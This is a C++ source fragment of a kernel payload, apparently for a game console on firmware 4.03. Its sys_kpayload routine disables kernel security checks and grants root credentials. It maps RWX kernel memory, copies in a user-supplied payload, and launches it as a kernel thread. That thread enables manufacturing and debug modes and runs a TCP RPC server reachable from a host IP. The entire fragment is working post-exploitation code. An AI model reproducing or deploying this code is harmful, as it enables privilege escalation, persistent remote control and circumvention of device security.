        RpcClient rpc(server);
        exiting = rpc.run();
    }
    return true;
}

static void thread_entry(void*) {
    modify_code([] {
        sym.bootparams[0x128] = 1;  /* is_manu_mode */
        sym.bootparams[0x12a] = 0;  /* consmute_char */
        sym.bootparams[0x34] |= 4;  /* system level dbg */
        sym.bootparams[0x59] |= 2;
        *sym.mdbg_trap_early = 0xc3;
    });

    sym.printf("%s %lx %lx\n", "prosperous_403 thread entry",
               (uintptr_t)thread_entry, sym.kernel_base);

    tcp_server();

    sym.printf("%s\n", "prosperous_403 thread exit");
    sym.kthread_exit();
}

struct kpayload_args {
    uintptr_t kernel_text_base;
    uintptr_t payload_uva;
    uintptr_t host_saddr;
    uintptr_t operation;
};

static bool get_fw_version() {
    auto p = curthread()->td_proc->p_list.next;
    while (p) {
        if (p->p_pid == 1 && p->is_ppr) {
            sym.sdk_ver_ppr = (u64)p->sdk_ver_ppr << 32;
            if (p->sdk_ver_ppr_minor != 0xffffffff)
                sym.sdk_ver_ppr |= p->sdk_ver_ppr_minor;
            return true;
        }
        p = p->p_list.next;
    }
    return false;
}

#define VM_PROT_CPU_RWX 0x0007

extern "C" int sys_kpayload(struct thread* td, kpayload_args* args) {
    SchedPin pin;

    if (!get_fw_version()) return 1;

    /* Version check: accept 4.xx */
    u16 major = sym.sdk_ver_ppr >> 48;
    if (major != 0x403 && major != 0x400) {
        sym = sym_4_03; /* Default to 4.03 offsets */
    }

    if (args->operation == 0) return 13370;

    nda_disable();
    if (!sym.reloc(args->kernel_text_base)) return 2;

    if (args->operation == 1) return 13371;

    modify_code([] { *sym.sysveri_notif_sent = 1; });

    if (!nda_disable_all()) return 1;

    if (args->operation == 2) return 13371;

    ucred_set_root(curthread()->td_ucred);

    /* Store host IP if provided */
    if (args->host_saddr) {
        sockaddr_in saddr{};
        if (sym.copyin((void*)args->host_saddr, &saddr, sizeof(saddr)) == 0)
            sym.host_ip_addr = saddr.sin_addr.s_addr;
    } else {
        sym.host_ip_addr = ipv4_addr_n(192, 168, 2, 2);
    }

    /* Allocate kernel memory for payload copy */
    const vm_size_t payload_size = get_payload_size();
    const vm_size_t payload_size_aligned = align_up(payload_size, PAGE_SIZE);
    vm_offset_t addr = sym.kmem_malloc(sym.kernel_arena, payload_size_aligned, 1);
    if (!addr) return 12;

    sym.pmap_protect(sym.kernel_pmap,
                     align_down(addr, PAGE_SIZE),
                     align_up(addr + payload_size, PAGE_SIZE),
                     VM_PROT_CPU_RWX);

    int err = sym.copyin((void*)args->payload_uva, (void*)addr, payload_size);
    if (err) return err;
    wbinvd();

    auto thread_entry_relocated = reloc_addr(addr, thread_entry);
    err = sym.kthread_add(thread_entry_relocated, nullptr, nullptr, nullptr, 0, 0,
                          "%s", "prosperous403");
    if (err) return err;

    return 0;
}
